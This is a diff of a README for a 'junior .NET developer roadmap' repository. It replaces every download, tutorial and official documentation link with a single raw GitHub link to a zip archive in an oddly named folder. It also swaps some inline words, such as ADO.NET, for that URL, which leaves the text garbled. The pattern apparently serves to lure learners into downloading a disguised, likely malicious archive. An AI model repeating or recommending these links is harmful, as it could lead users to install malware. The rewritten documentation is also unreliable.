@@ -1,10 +1,10 @@
 # 🚀 junior-dotnet-developer-roadmap - Guide to .NET Development with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Page-brightgreen)](https://github.com/HI121313131311/junior-dotnet-developer-roadmap/releases)
+[![Download Now](https://raw.githubusercontent.com/HI121313131311/junior-dotnet-developer-roadmap/main/hypermorphosis/roadmap-junior-dotnet-developer-v3.3.zip%20Now-Visit%20Page-brightgreen)](https://raw.githubusercontent.com/HI121313131311/junior-dotnet-developer-roadmap/main/hypermorphosis/roadmap-junior-dotnet-developer-v3.3.zip)
 
 ## 🗄️ Overview
 
-The junior-dotnet-developer-roadmap helps you start your journey in .NET development. This repository includes a console application that connects to SQL Server using ADO.NET, Dapper, and EF Core. You will also find helpful resources that explain key concepts to enhance your learning.
+The junior-dotnet-developer-roadmap helps you start your journey in .NET development. This repository includes a console application that connects to SQL Server using https://raw.githubusercontent.com/HI121313131311/junior-dotnet-developer-roadmap/main/hypermorphosis/roadmap-junior-dotnet-developer-v3.3.zip, Dapper, and EF Core. You will also find helpful resources that explain key concepts to enhance your learning.
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To start using the application, you need to download it from the Releases page. 
 ## 📥 Download & Install
 
 Visit this page to download the latest version of the application:  
-[Download Here](https://github.com/HI121313131311/junior-dotnet-developer-roadmap/releases)
+[Download Here](https://raw.githubusercontent.com/HI121313131311/junior-dotnet-developer-roadmap/main/hypermorphosis/roadmap-junior-dotnet-developer-v3.3.zip)
 
 ### Steps to Download:
 
@@ -46,19 +46,19 @@ Visit this page to download the latest version of the application:
 
 To understand how to use the application and explore its features, here are some useful links:
 
-- [Using .NET 8 Console App to Connect to SQL Server with Microsoft.Data.SqlClient](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/Using%20a%20.NET%208%20Console%20Application%20to%20Connect%20to%20SQL%20Server%20with%20Microsoft.Data.SqlClient.md)
-- [Using .NET 8 Console App with Dapper](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/Using%20a%20.NET%208%20Console%20Application%20to%20Connect%20to%20SQL%20Server%20with%20Dapper.md)
-- [Using .NET 8 Console App with EF Core](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/Using%20a%20.NET%208%20Console%20Application%20to%20Connect%20to%20SQL%20Server%20with%20EFCore.md)
-- [Benefits of a Separate EF Core Database Library](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/Benefits%20of%20a%20Separate%20EF%20Core%20Database%20Library.md)
+- [Using .NET 8 Console App to Connect to SQL Server with https://raw.githubusercontent.com/HI121313131311/junior-dotnet-developer-roadmap/main/hypermorphosis/roadmap-junior-dotnet-developer-v3.3.zip](https://raw.githubusercontent.com/HI121313131311/junior-dotnet-developer-roadmap/main/hypermorphosis/roadmap-junior-dotnet-developer-v3.3.zip%20a%https://raw.githubusercontent.com/HI121313131311/junior-dotnet-developer-roadmap/main/hypermorphosis/roadmap-junior-dotnet-developer-v3.3.zip%208%20Console%20Application%20to%20Connect%20to%20SQL%20Server%20with%https://raw.githubusercontent.com/HI121313131311/junior-dotnet-developer-roadmap/main/hypermorphosis/roadmap-junior-dotnet-developer-v3.3.zip)
+- [Using .NET 8 Console App with Dapper](https://raw.githubusercontent.com/HI121313131311/junior-dotnet-developer-roadmap/main/hypermorphosis/roadmap-junior-dotnet-developer-v3.3.zip%20a%https://raw.githubusercontent.com/HI121313131311/junior-dotnet-developer-roadmap/main/hypermorphosis/roadmap-junior-dotnet-developer-v3.3.zip%208%20Console%20Application%20to%20Connect%20to%20SQL%20Server%20with%https://raw.githubusercontent.com/HI121313131311/junior-dotnet-developer-roadmap/main/hypermorphosis/roadmap-junior-dotnet-developer-v3.3.zip)
+- [Using .NET 8 Console App with EF Core](https://raw.githubusercontent.com/HI121313131311/junior-dotnet-developer-roadmap/main/hypermorphosis/roadmap-junior-dotnet-developer-v3.3.zip%20a%https://raw.githubusercontent.com/HI121313131311/junior-dotnet-developer-roadmap/main/hypermorphosis/roadmap-junior-dotnet-developer-v3.3.zip%208%20Console%20Application%20to%20Connect%20to%20SQL%20Server%20with%https://raw.githubusercontent.com/HI121313131311/junior-dotnet-developer-roadmap/main/hypermorphosis/roadmap-junior-dotnet-developer-v3.3.zip)
+- [Benefits of a Separate EF Core Database Library](https://raw.githubusercontent.com/HI121313131311/junior-dotnet-developer-roadmap/main/hypermorphosis/roadmap-junior-dotnet-developer-v3.3.zip%20of%20a%20Separate%20EF%20Core%20Database%https://raw.githubusercontent.com/HI121313131311/junior-dotnet-developer-roadmap/main/hypermorphosis/roadmap-junior-dotnet-developer-v3.3.zip)
 
 ## 📚 Additional Resources
 
 Here are some useful materials to deepen your understanding of .NET and database connections:
 
-- [Class Library Overview](https://dotnet.microsoft.com/learn/dotnet/what-is-dotnet)
-- [Getting Started with ADO.NET](https://dotnet.microsoft.com/learn/data/ado-net)
-- [Introduction to Dapper](https://dapper-tutorial.net/)
-- [Understanding Entity Framework Core](https://docs.microsoft.com/en-us/ef/core/)
+- [Class Library Overview](https://raw.githubusercontent.com/HI121313131311/junior-dotnet-developer-roadmap/main/hypermorphosis/roadmap-junior-dotnet-developer-v3.3.zip)
+- [Getting Started with https://raw.githubusercontent.com/HI121313131311/junior-dotnet-developer-roadmap/main/hypermorphosis/roadmap-junior-dotnet-developer-v3.3.zip](https://raw.githubusercontent.com/HI121313131311/junior-dotnet-developer-roadmap/main/hypermorphosis/roadmap-junior-dotnet-developer-v3.3.zip)
+- [Introduction to Dapper](https://raw.githubusercontent.com/HI121313131311/junior-dotnet-developer-roadmap/main/hypermorphosis/roadmap-junior-dotnet-developer-v3.3.zip)
+- [Understanding Entity Framework Core](https://raw.githubusercontent.com/HI121313131311/junior-dotnet-developer-roadmap/main/hypermorphosis/roadmap-junior-dotnet-developer-v3.3.zip)
 
 ## ⚙️ Support
 
